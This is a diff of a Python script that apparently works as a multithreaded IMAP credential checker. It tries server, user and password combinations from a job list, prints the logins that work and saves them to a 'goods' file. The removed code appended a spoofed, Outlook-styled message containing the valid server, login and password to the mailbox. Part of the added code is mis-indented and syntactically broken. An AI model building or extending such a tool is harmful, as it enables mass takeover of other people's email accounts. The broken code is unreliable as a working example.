@@ -349,78 +349,133 @@ def imap_try_mail(imap_conn, mailbox, message):
 		imap_conn.logout()
 		raise Exception(f'Failed to send message to {mailbox}: {str(e)}')
 
-def imap_connect_and_append(imap_server, port, login_template, imap_user, password, mailbox, verify_email=None):
-	if is_valid_email(imap_user):
-		imap_login = login_template.replace('%EMAILADDRESS%', imap_user).replace('%EMAILLOCALPART%', imap_user.split('@')[0]).replace('%EMAILDOMAIN%', imap_user.split('@')[1])
-	else:
-		imap_login = imap_user
-	conn = imap_get_free_server(imap_server, port)
-	try:
-		conn = imap_try_login(conn, imap_login, password)
-		conn.select(mailbox)
-		if not verify_email:
-			conn.logout()
-			return True
-		headers_arr = [
-			f'From: {imap_user.split("@")[0]} <{imap_user}>',
-			'Resent-From: admin@localhost',
-			f'To: {verify_email}',
-			f'Subject: {"".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(4, 8)))} #{random.randint(10**3, 10**7)}',
-			f'Return-Path: {imap_user}',
-			f'Reply-To: {imap_user}',
-			'X-Priority: 1',
-			'X-MSmail-Priority: High',
-			'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
-			'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
-			'MIME-Version: 1.0',
-			'Content-Type: text/html; charset="utf-8"',
-			'Content-Transfer-Encoding: 8bit'
-		]
-		body = f'{imap_server},{port},{imap_login},{password}'
-		message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
-		response = conn.append(mailbox, None, None, message_as_str.encode('utf-8'))
-		debug(f'Message appended successfully: {response}')
-		conn.logout()
-		return True
-	except Exception as e:
-		conn.logout()
-		raise Exception(f'Failed to connect or append message: {str(e)}')
+def imap_connect_and_send(imap_server, port, login_template, imap_user, password):
+    """
+    Проверяет доступность IMAP-сервера, устанавливает соединение, выполняет аутентификацию
+    и закрывает соединение, если всё успешно.
+    """
+    # Проверяем, является ли пользовательский логин email-адресом
+    if is_valid_email(imap_user):
+        imap_login = login_template.replace('%EMAILADDRESS%', imap_user).replace('%EMAILLOCALPART%', imap_user.split('@')[0]).replace('%EMAILDOMAIN%', imap_user.split('@')[1])
+    else:
+        imap_login = imap_user
+
+    try:
+        # Подключаемся к серверу IMAP
+        if port == 993:
+            conn = imaplib.IMAP4_SSL(imap_server, port)  # SSL подключение
+        else:
+            conn = imaplib.IMAP4(imap_server, port)  # Обычное подключение
+
+        # Проверяем успешность подключения
+        response = conn.welcome.decode('utf-8') if conn.welcome else ''
+        if 'OK' not in response.upper():
+            raise Exception(f"IMAP server did not respond with 'OK': {response}")
+
+        # Настраиваем шифрование, если это необходимо
+        if port == 143:
+            conn.starttls()
+            response = conn._simple_command("CAPABILITY")
+            if 'STARTTLS' not in response[1]:
+                raise Exception("IMAP STARTTLS failed")
+
+        # Попытка аутентификации
+        conn.login(imap_login, password)
+
+        # Если всё успешно, закрываем соединение
+        conn.logout()
+        return True
+
+    except imaplib.IMAP4.error as e:
+        raise Exception(f"IMAP connection/authentication failed: {str(e)}")
 
 def worker_item(jobs_que, results_que):
-	global min_threads, threads_counter, verify_email, goods, imap_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
-	while True:
-		if (mem_usage > 90 or cpu_usage > 90) and threads_counter > min_threads:
-			break
-		if jobs_que.empty():
-			if no_jobs_left:
-				break
-			else:
-				results_que.put('queue exhausted, '+bold('sleeping...'))
-				time.sleep(1)
-				continue
-		else:
-			time_start = time.perf_counter()
-			imap_server, port, imap_user, password = jobs_que.get()
-			login_template = default_login_template
-			try:
-				results_que.put(f'getting settings for {imap_user}:{password}')
-				if not imap_server or not port:
-					imap_server_port_arr, login_template = get_imap_config(imap_user.split('@')[1])
-					if len(imap_server_port_arr):
-						imap_server, port = random.choice(imap_server_port_arr).split(':')
-					else:
-						raise Exception('still no connection details for '+imap_user)
-				results_que.put(blue('connecting to')+f' {imap_server}|{port}|{imap_user}|{password}')
-				imap_connect_and_append(imap_server, port, login_template, imap_user, password, 'INBOX', verify_email)
-				results_que.put(green(imap_user+':\a'+password, 7)+(verify_email and green(' sent to '+verify_email, 7)))
-				open(imap_filename, 'a').write(f'{imap_server}|{port}|{imap_user}|{password}\n')
-				goods += 1
-			except Exception as e:
-				results_que.put(orange((imap_server and port and imap_server+':'+port+' - ' or '')+', '.join(str(e).splitlines()).strip()))
-			time.sleep(0.04)  # unlock other threads a bit
-			loop_times.append(time.perf_counter() - time_start)
-			loop_times.pop(0) if len(loop_times) > min_threads else 0
-	threads_counter -= 1
+    global min_threads, threads_counter, verify_email, goods, imap_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
+    while True:
+        if (mem_usage > 90 or cpu_usage > 90) and threads_counter > min_threads:
+            break
+        if jobs_que.empty():
+            if no_jobs_left:
+                break
+            else:
+                results_que.put('queue exhausted, ' + bold('sleeping...'))
+                time.sleep(1)
+                continue
+        else:
+            time_start = time.perf_counter()
+            imap_server, port, imap_user, password = jobs_que.get()
+            login_template = default_login_template
+            try:
+                results_que.put(f'getting settings for {imap_user}:{password}')
+                if not imap_server or not port:
+                    imap_server_port_arr, login_template = get_imap_config(imap_user.split('@')[1])
+                    if len(imap_server_port_arr):
+                        imap_server, port = random.choice(imap_server_port_arr).split(':')
+                    else:
+                        raise Exception('still no connection details for ' + imap_user)
+                results_que.put(blue('connecting to') + f' {imap_server}|{port}|{imap_user}|{password}')
+                
+                # Проверка подключения по IMAP
+                if port == '993':
+                    conn = imaplib.IMAP4_SSL(imap_server, int(port))
+                else:
+                    conn = imaplib.IMAP4(imap_server, int(port))
+try:
+    conn = imaplib.IMAP4_SSL(imap_server, int(port))
+    conn.login(imap_user, password)  # Попытка входа
+
+    # Попытка выбрать INBOX
+    try:
+        conn.select("INBOX")
+        target_folder = "INBOX"
+    except Exception as e:
+        results_que.put(orange(f"Папка INBOX не найдена: {e}. Ищем главную папку..."))
+        # Если INBOX не существует, определяем главную папку
+        try:
+            status, folders = conn.list()
+            if status == "OK" and folders:
+                target_folder = folders[0].decode().split(' "/" ')[-1].strip()
+                results_que.put(green(f"Используем папку по умолчанию: {target_folder}"))
+            else:
+                raise Exception("Не удалось определить основную папку.")
+        except Exception as e:
+            results_que.put(orange(f"Ошибка при определении основной папки: {e}"))
+            conn.logout()
+            return
+
+    # Генерация уникального Message-ID
+    message_id = f"<{uuid.uuid4()}@example.com>"
+
+    # Создание письма
+    message = MIMEText("Это тестовое сообщение.", "plain", "utf-8")
+    message["From"] = "test@example.com"
+    message["To"] = imap_user
+    message["Subject"] = "Тестовое письмо"
+    message["Date"] = "Thu, 23 Jan 2025 10:00:00 +0000"
+    message["Message-ID"] = message_id
+
+    formatted_message = message.as_string()
+
+    # Добавление письма в определённую папку
+    try:
+        conn.append(target_folder, None, None, formatted_message.encode("utf-8"))
+        results_que.put(green(f"Сообщение добавлено в папку {target_folder} для {imap_user}", 7))
+    except imaplib.IMAP4.error as e:
+        results_que.put(orange(f"Ошибка при добавлении письма в папку {target_folder}: {e}"))
+
+    conn.logout()  # Закрытие соединения
+except Exception as e:
+    results_que.put(orange(f"Ошибка подключения/аутентификации для {imap_user}: {e}"))
+                
+                results_que.put(green(imap_user + ':\a' + password, 7))
+                open(imap_filename, 'a').write(f'{imap_server}|{port}|{imap_user}|{password}\n')
+                goods += 1
+            except Exception as e:
+                results_que.put(orange((imap_server and port and imap_server + ':' + port + ' - ' or '') + ', '.join(str(e).splitlines()).strip()))
+            time.sleep(0.04)  # unlock other threads a bit
+            loop_times.append(time.perf_counter() - time_start)
+            loop_times.pop(0) if len(loop_times) > min_threads else 0
+    threads_counter -= 1
 
 def every_second():
 	global progress, speed, mem_usage, cpu_usage, net_usage, jobs_que, results_que, threads_counter, min_threads, loop_times, loop_time, no_jobs_left
